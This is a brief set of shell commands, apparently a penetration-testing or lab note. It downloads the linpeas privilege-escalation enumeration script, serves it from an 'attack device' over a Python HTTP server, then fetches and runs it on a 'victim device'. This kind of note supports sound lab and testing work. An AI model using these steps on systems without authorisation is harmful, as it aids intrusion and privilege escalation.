## ATTACK DEVICE
# download the linpeas script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# up a python server
python3 -m http.server 9999

## VICTIM DEVICE
# get the script from the attacking device
wget http://10.10.14.8:9999/linpeas.sh
# change execution mode
chmod +x ./linpeas.sh
# run
./linpeas.sh